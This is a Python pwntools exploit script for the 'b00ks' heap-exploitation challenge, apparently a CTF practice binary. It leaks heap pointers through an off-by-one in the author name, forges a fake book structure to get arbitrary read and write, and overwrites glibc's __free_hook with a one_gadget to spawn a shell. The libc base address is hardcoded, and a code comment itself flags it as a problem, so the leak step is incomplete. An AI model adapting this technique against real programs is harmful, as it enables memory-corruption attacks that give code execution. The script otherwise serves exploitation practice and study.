from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
io = process("./b00ks")
libc = ELF("./libc-2.23.so")

def create(name_size,content1,des_size,content2):
    io.sendlineafter(b'>',str(1))
    io.sendlineafter(b'size: ',str(name_size))
    io.sendlineafter(b'(Max 32 chars): ',content1)
    io.sendlineafter(b'size: ',str(des_size))
    io.sendlineafter(b'description: ',content2)

def delete(idx):
    io.sendlineafter(b'>',str(2))
    io.sendlineafter(b'delete: ',str(idx))

def edit(idx,content):
    io.sendlineafter(b'>',str(3))
    io.sendlineafter(b"edit: ",str(idx))
    io.sendlineafter(b'description: ',content)

def print_name():
    io.sendlineafter(b'>',str(4))

def change_name(name):
    io.sendlineafter(b'>',str(5))
    io.sendlineafter(b'name: ',name)

def debug():
    gdb.attach(io)
    pause()

# round1
author_name = b'x'*0x20 # this point can leak the point info
io.sendline(author_name)
create(128,b'aaaa',0x70,b'bbbb')   # idx1
print_name()
io.recvuntil(b'Author:')
io.recvuntil(b'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
book1_add = u64(io.recv(6).ljust(0x08,b"\x00"))
book2_add = book1_add+0X30
success("book1 addr is -> {}".format(hex(book1_add)))
success("book2 addr is -> {}".format(hex(book2_add)))

# round2
create(0x21000,b'cccc',0x21000,b'dddd')   # idx2
payload=b'a'*0x50+p64(1)+p64(book2_add+0x8)+p64(book2_add+0x10)+p64(0xffff)
edit(1,payload)
change_name(b'a'*0x20)
print_name()
io.recvuntil(b'Description: ')
mmap_add = u64(io.recv(6).ljust(0x08,b"\x00"))
libcbase = 0x7ffff7800000   # this is a problem!
success("mmap addr is -> {}".format(hex(mmap_add)))
success("libcbase addr is -> {}".format(hex(libcbase)))

# round3
free_hook = libcbase+libc.sym['__free_hook']
gadget = [0x4525a,0xef9f4,0xf0897]
one_gadget = libcbase+gadget[0]
edit(1,p64(free_hook))
edit(2,p64(one_gadget))
delete(2)

# debug()
io.interactive()